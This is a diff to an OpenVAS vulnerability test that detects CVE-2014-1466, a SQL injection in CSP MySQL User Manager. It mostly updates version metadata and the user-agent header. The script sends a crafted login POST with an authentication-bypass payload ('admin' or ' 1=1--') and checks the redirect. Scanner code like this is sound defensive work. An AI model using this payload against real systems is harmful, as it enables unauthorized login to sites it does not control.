@@ -1,6 +1,6 @@
 ##############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_csp_mysql_user_manager_sql_inj_vuln.nasl 11187 2018-09-03 09:59:13Z mmartin $
+# $Id: gb_csp_mysql_user_manager_sql_inj_vuln.nasl 11222 2018-09-04 12:41:44Z cfischer $
 #
 # CSP MySQL User Manager SQL Injection Vulnerability
 #
@@ -27,12 +27,12 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.804229");
-  script_version("$Revision: 11187 $");
+  script_version("$Revision: 11222 $");
   script_cve_id("CVE-2014-1466");
   script_bugtraq_id(64731);
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2018-09-03 11:59:13 +0200 (Mon, 03 Sep 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-04 14:41:44 +0200 (Tue, 04 Sep 2018) $");
   script_tag(name:"creation_date", value:"2014-01-28 11:34:43 +0530 (Tue, 28 Jan 2014)");
   script_name("CSP MySQL User Manager SQL Injection Vulnerability");
 
@@ -71,11 +71,11 @@ include("host_details.inc");
 include("http_keepalive.inc");
 
 cspPort = get_http_port(default:80);
-
 if(!can_host_php(port:cspPort)){
   exit(0);
 }
 
+useragent = get_http_user_agent();
 host = http_host_name(port:cspPort);
 
 foreach dir (make_list_unique("/cmum", "/cspmum", "/", cgi_dirs(port:cspPort)))
@@ -87,20 +87,18 @@ foreach dir (make_list_unique("/cmum", "/cspmum", "/", cgi_dirs(port:cspPort)))
 
   if(cspRes && ">:: CSP MySQL User Manager<" >< cspRes)
   {
-    ## Send crafted request and receive the response
     url = dir + "/login.php";
     payload = "loginuser=admin%27+or+%27+1%3D1--&loginpass=" + rand_str(length:5);
 
     cspReq = string("POST ",url," HTTP/1.1\r\n",
                  "Host: ", host, "\r\n",
-                 "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
+                 "User-Agent: ", useragent, "\r\n",
                  "Referer: http://", host, dir, "/index.php \r\n",
                  "Connection: keep-alive\r\n",
                  "Cookie: PHPSESSID=fb8c63eb59035022c9f853dba0785c4f\r\n",
                  "Content-Type: application/x-www-form-urlencoded\r\n",
                  "Content-Length: ",strlen(payload), "\r\n\r\n",
                  payload);
-
     cspRes = http_keepalive_send_recv(port:cspPort, data:cspReq);
 
     if(cspRes && cspRes =~ "HTTP/1.. 302 Found" && "Location: home.php" >< cspRes)
